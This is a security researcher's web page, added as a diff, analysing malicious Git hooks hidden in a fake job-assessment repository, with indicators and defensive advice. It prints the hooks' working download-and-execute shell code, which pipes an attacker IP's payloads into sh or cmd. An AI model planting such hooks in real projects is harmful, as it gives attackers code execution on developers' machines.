@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Security research note on malicious Git hooks found in a developer recruitment repository." />
+  <title>Malicious Git Hooks in a Recruitment Repository — @jerem0010</title>
+  <style>
+    :root { --bg:#0d0f12; --text:#e8e8e8; --muted:#9ca3ad; --line:#272b31; --accent:#c7f284; --max:820px; }
+    * { box-sizing:border-box; }
+    html { scroll-behavior:smooth; }
+    body { margin:0; background:var(--bg); color:var(--text); font-family:Arial,Helvetica,sans-serif; line-height:1.65; -webkit-font-smoothing:antialiased; }
+    .page { width:min(calc(100% - 32px),var(--max)); margin:0 auto; padding:42px 0 72px; }
+    a { color:var(--accent); text-decoration:none; } a:hover { text-decoration:underline; }
+    .mono,code,pre { font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono",monospace; }
+    .top { margin-bottom:48px; }
+    .back { display:inline-block; margin-bottom:34px; color:var(--muted); font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono",monospace; font-size:.85rem; }
+    .label { margin-bottom:10px; color:var(--accent); font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono",monospace; font-size:.78rem; text-transform:uppercase; letter-spacing:.08em; }
+    h1 { margin:0 0 14px; font-size:clamp(2rem,6vw,3.8rem); line-height:1.05; letter-spacing:-.045em; font-weight:700; }
+    .subtitle { max-width:680px; margin:0 0 18px; color:var(--muted); font-size:1.02rem; }
+    .meta { color:#6f7680; font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono",monospace; font-size:.78rem; }
+    section { padding:30px 0; border-top:1px solid var(--line); }
+    h2 { margin:0 0 18px; font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono",monospace; font-size:.92rem; font-weight:700; text-transform:uppercase; letter-spacing:.06em; }
+    p { margin:0 0 16px; color:var(--muted); font-size:.97rem; }
+    strong { color:var(--text); }
+    code { padding:1px 4px; color:var(--accent); font-size:.9em; }
+    pre { overflow-x:auto; margin:18px 0; padding:16px 0; border-top:1px solid var(--line); border-bottom:1px solid var(--line); color:#d6d9de; font-size:.84rem; line-height:1.6; white-space:pre-wrap; word-break:break-word; }
+    .quote { margin:18px 0; padding-left:16px; border-left:2px solid var(--accent); color:var(--text); font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono",monospace; font-size:.88rem; }
+    figure { margin:22px 0; }
+    figure img { display:block; width:100%; height:auto; border:1px solid var(--line); }
+    figcaption { margin-top:8px; color:#6f7680; font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono",monospace; font-size:.74rem; line-height:1.45; }
+    .ioc { margin-top:8px; }
+    .ioc-row { display:grid; grid-template-columns:120px 1fr; gap:18px; padding:8px 0; border-bottom:1px solid rgba(255,255,255,.04); }
+    .ioc-row:last-child { border-bottom:0; }
+    .ioc-key { color:#6f7680; font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono",monospace; font-size:.78rem; text-transform:uppercase; }
+    .ioc-value { color:var(--muted); font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono",monospace; font-size:.84rem; overflow-wrap:anywhere; }
+    ul { margin:0 0 16px 20px; padding:0; color:var(--muted); } li { margin-bottom:6px; }
+
+    .technical-note {
+      margin: 18px 0;
+      padding-left: 16px;
+      border-left: 2px solid var(--line);
+    }
+
+    .technical-note p:last-child {
+      margin-bottom: 0;
+    }
+
+    .cmd-label {
+      margin: 18px 0 4px;
+      color: #6f7680;
+      font-family:
+        ui-monospace,
+        SFMono-Regular,
+        Menlo,
+        Monaco,
+        Consolas,
+        "Liberation Mono",
+        monospace;
+      font-size: 0.74rem;
+    }
+
+    footer { padding-top:28px; border-top:1px solid var(--line); color:#6f7680; font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono",monospace; font-size:.78rem; }
+    @media (max-width:600px) { .page { width:min(calc(100% - 24px),var(--max)); padding-top:28px; } .ioc-row { grid-template-columns:1fr; gap:3px; } }
+  </style>
+</head>
+<body>
+  <main class="page">
+    <header class="top">
+      <a class="back" href="../../">← @jerem0010</a>
+      <div class="label">security research / incident note</div>
+      <h1>Malicious Git Hooks in a Recruitment Repository</h1>
+      <p class="subtitle">Analysis of a suspicious developer assessment archive containing Git hooks that could execute remote code during normal repository operations.</p>
+      <div class="meta">Jérémy Le Nezet · 2026-09-04</div>
+    </header>
+
+    <section>
+      <h2>Context</h2>
+      <p>During a developer recruitment process, I received a ZIP archive named <code>Skyron.zip</code> containing a Python/Flask blockchain project.</p>
+      <p>The recruiter specifically asked me to review <code>skyron/block.py</code>.</p>
+      <figure>
+        <img src="assets/01-recruiter-block-py-request.png" alt="Recruiter asking for a review of the Skyron codebase and skyron/block.py" />
+        <figcaption>Fig. 1 — Initial code-review request referencing skyron/block.py.</figcaption>
+      </figure>
+      <p>The archive included the full <code>.git</code> directory, so I inspected the repository before running the application or changing branches.</p>
+    </section>
+
+
+      <figure>
+        <img
+          src="assets/04-project-root-folder.png"
+          alt="Root contents of the supplied Skyron archive"
+        />
+        <figcaption>
+          Root of the supplied archive, including the <code>.git</code> directory and <code>skyron/</code> package.
+        </figcaption>
+      </figure>
+
+      <figure>
+        <img
+          src="assets/05-skyron-folder-contents.png"
+          alt="Contents of the supplied skyron folder"
+        />
+        <figcaption>
+          Contents of the supplied <code>skyron/</code> folder. The requested <code>block.py</code> is not present in this working tree.
+        </figcaption>
+      </figure>
+
+    <section>
+      <h2>Finding</h2>
+
+      <p>
+        Three custom Git hooks were present in the supplied archive:
+      </p>
+
+      <pre>.git/hooks/pre-commit
+.git/hooks/pre-push
+.git/hooks/post-checkout</pre>
+
+      <p>
+        All three contained essentially the same cross-platform
+        download-and-execute logic. The relevant hook body was:
+      </p>
+
+      <pre><code>#!/bin/sh
+
+case "$OSTYPE" in
+  darwin*)
+    curl -s 'http://38.146.27.178/302/302m' -L | sh &gt; /dev/null 2&gt;&amp;1 &amp;
+    ;;
+  linux*)
+    wget -qO- 'http://38.146.27.178/302/302l' -L | sh &gt; /dev/null 2&gt;&amp;1 &amp;
+    ;;
+  msys*|cygwin*)
+    curl -s 'http://38.146.27.178/302/302w' -L | cmd &gt; /dev/null 2&gt;&amp;1 &amp;
+    ;;
+esac</code></pre>
+
+      <div class="technical-note">
+        <p>
+          The hook detects the host operating system, retrieves an OS-specific
+          remote resource and pipes the response directly into a command
+          interpreter.
+        </p>
+        <p>
+          <code>&gt; /dev/null 2&gt;&amp;1</code> suppresses standard output and
+          standard error, while <code>&amp;</code> backgrounds execution.
+        </p>
+        <p>
+          The hook itself does not perform privilege escalation. Any downloaded
+          code would execute with the privileges of the current user.
+        </p>
+      </div>
+    </section>
+
+    <section>
+      <h2>Repository State</h2>
+
+      <p>
+        The archive opened on the <code>dev</code> branch. In that working tree,
+        the requested <code>skyron/block.py</code> file was absent.
+      </p>
+
+      <p>
+        Repository history showed that <code>block.py</code> existed on
+        <code>main</code> and had been removed from <code>dev</code> in commit:
+      </p>
+
+      <pre>288913b  "unstaged block"</pre>
+
+      <p>
+        This made the instruction to switch to <code>main</code> technically
+        coherent while also directing the developer toward a Git operation that
+        could invoke <code>post-checkout</code>.
+      </p>
+
+      <div class="cmd-label">Relevant inspection commands</div>
+      <pre><code>git branch
+git log --oneline --all
+git show main:skyron/block.py
+git show 288913b --stat</code></pre>
+
+      <p>
+        The hooks were present inside the supplied <code>.git/hooks/</code>
+        directory but were not tracked as repository files:
+      </p>
+
+      <pre><code>git ls-files .git/hooks</code></pre>
+
+      <p>
+        No tracked hook files were returned. This is important because a normal
+        clone of the repository would not reproduce these local hook files; their
+        presence was specific to the distributed repository archive.
+      </p>
+    </section>
+
+    <section>
+      <h2>Trigger</h2>
+
+      <p>
+        After I reported that <code>block.py</code> was missing from the current
+        working tree, the recruiter explicitly asked me to switch to
+        <code>main</code>.
+      </p>
+
+      <figure>
+        <img
+          src="assets/02-switch-to-main.png"
+          alt="Recruiter asking the developer to switch the Git branch to main"
+        />
+        <figcaption>
+          Recruiter instruction to switch to the <code>main</code> branch.
+        </figcaption>
+      </figure>
+
+      <pre>Recruiter instruction
+        |
+        v
+git checkout main
+        |
+        v
+.git/hooks/post-checkout
+        |
+        +-- Linux   -> wget .../302l | sh
+        +-- macOS   -> curl .../302m | sh
+        +-- Windows -> curl .../302w | cmd</pre>
+
+      <p>
+        I did not execute the checkout.
+      </p>
+    </section>
+
+    <section>
+      <h2>Response</h2>
+
+      <p>
+        I disclosed the suspicious hooks, explained that they appeared to
+        download and execute remote scripts, and asked why they were included.
+      </p>
+
+      <figure>
+        <img
+          src="assets/03-hook-disclosure-conversation-ended.png"
+          alt="Message disclosing the suspicious Git hooks followed by the conversation ending"
+        />
+        <figcaption>
+          Disclosure of the Git hooks. The conversation was terminated immediately afterward.
+        </figcaption>
+      </figure>
+    </section>
+
+    <section>
+      <h2>Campaign Correlation</h2>
+      <p>I later found an independent public report describing an almost identical recruitment sequence involving the same project.</p>
+      <ul>
+        <li>same Skyron project</li>
+        <li>same requested <code>skyron/block.py</code></li>
+        <li>same Git hook names</li>
+        <li>same IP address</li>
+        <li>same OS-specific paths</li>
+        <li>same instruction to switch to <code>main</code></li>
+      </ul>
+      <p>This is consistent with a repeated developer-targeting campaign. It does not, by itself, establish attribution or prove that every account involved was controlled by the same operator.</p>
+    </section>
+
+    <section>
+      <h2>Indicators</h2>
+      <div class="ioc">
+        <div class="ioc-row"><div class="ioc-key">IPv4</div><div class="ioc-value">38.146.27.178</div></div>
+        <div class="ioc-row"><div class="ioc-key">Paths</div><div class="ioc-value">/302/302m<br />/302/302l<br />/302/302w</div></div>
+        <div class="ioc-row"><div class="ioc-key">Hooks</div><div class="ioc-value">.git/hooks/pre-commit<br />.git/hooks/pre-push<br />.git/hooks/post-checkout</div></div>
+        <div class="ioc-row"><div class="ioc-key">Artifact</div><div class="ioc-value">Skyron.zip</div></div>
+      </div>
+    </section>
+
+    <section>
+      <h2>Impact</h2>
+      <p>The hook itself does not automatically provide root or administrator privileges.</p>
+      <p>It does provide a mechanism for arbitrary commands to execute with the privileges of the developer running Git.</p>
+      <p>Depending on the host environment, this could expose developer assets such as SSH credentials, API tokens, source-control credentials, environment secrets, browser sessions, cloud credentials, or Web3-related development material.</p>
+      <p>I did not execute the remote payload, so the behavior of the second stage is outside the scope of this analysis.</p>
+    </section>
+
+    <section>
+      <h2>Takeaways</h2>
+      <ul>
+        <li>Treat coding-assessment repositories as untrusted code.</li>
+        <li>Inspect <code>.git/hooks</code> when a repository is delivered as an archive.</li>
+        <li>Do not assume Git operations are passive.</li>
+        <li>Review install and lifecycle scripts before running package managers.</li>
+        <li>Use isolated environments for unknown recruitment repositories.</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Scope</h2>
+      <p>Directly observed:</p>
+      <pre>custom Git hooks
+remote download-and-execute logic
+38.146.27.178
+OS-specific remote paths
+dev branch missing skyron/block.py
+main branch containing skyron/block.py
+commit 288913b removing block.py from dev
+hooks absent from tracked Git files
+request to switch to main
+conversation termination after disclosure</pre>
+      <p>Not established:</p>
+      <pre>operator identity
+final second-stage behavior
+attribution between different recruitment accounts</pre>
+    </section>
+
+
+    <section>
+      <h2>Original Job Posting</h2>
+
+      <p>
+        The recruitment process originated from the following Upwork listing,
+        which was later marked as no longer available.
+      </p>
+
+      <figure>
+        <img
+          src="assets/06-original-job-posting.png"
+          alt="Original Upwork listing for the Python and Golang Developer role"
+        />
+        <figcaption>
+          Original Upwork listing for the <code>Python &amp; Golang Developer</code> role.
+        </figcaption>
+      </figure>
+    </section>
+
+    <footer>
+      Jérémy Le Nezet · independent security research<br />
+      <a href="../../">portfolio</a> · <a href="https://github.com/jerem0010" target="_blank" rel="noreferrer">github</a>
+    </footer>
+  </main>
+</body>
+</html>
